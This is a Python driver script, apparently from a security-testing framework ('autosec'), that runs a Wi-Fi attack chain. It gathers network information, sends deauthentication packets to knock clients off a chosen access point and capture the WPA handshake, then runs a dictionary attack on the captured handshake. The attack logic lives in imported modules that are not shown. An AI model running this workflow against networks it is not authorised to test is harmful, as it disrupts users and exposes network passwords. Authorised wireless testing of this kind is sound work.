import os
import subprocess
import autosec.modules.wlan_attacks.information_gathering_service as information_gathering_service
import autosec.modules.wlan_attacks.handshake_deauth_service as handshake_deauth_service
import autosec.modules.wlan_attacks.dictionary_attack_service as dictionary_attack_service
from autosec.core.autosec_module import AutosecModule
from autosec.core.ressources.base import NetworkInterface
from autosec.core.ressources.wifi import WifiInformation


# ----------select interface----------
subprocess.run(
    args=["ifconfig"]
)
network_interface: NetworkInterface = NetworkInterface(
    interface=input("Select interface (e.g. wlo1): ")
)


# ----------information gathering----------
info: AutosecModule = information_gathering_service.load_module()[0]
info.run(
    inputs=[
        network_interface
    ]
)
print()


# ----------specifie wifi information----------
print("-------------------------")
print("Specifie wifi information")
print("-------------------------")
wifi_information: WifiInformation = WifiInformation(
    ssid=input("SSID: "),
    bssid_mac=input("BSSID: "),
    channel=int(input("Channel: "))
)
os.system("clear")


# ----------capture 4-way-handshake with deauthentication----------
print("------------------------------------------------------------")
print("Send deauthentication packets to capture the 4-way-handshake")
print("------------------------------------------------------------")
handshake: AutosecModule = handshake_deauth_service.load_module()[0]
handshake.run(
    inputs=[
        network_interface,
        wifi_information
    ]
)
os.system("clear")


# ----------dictionary attack----------
dictAttack: AutosecModule = dictionary_attack_service.load_module()[0]
dictAttack.run(
    inputs=[
        wifi_information
    ]
)
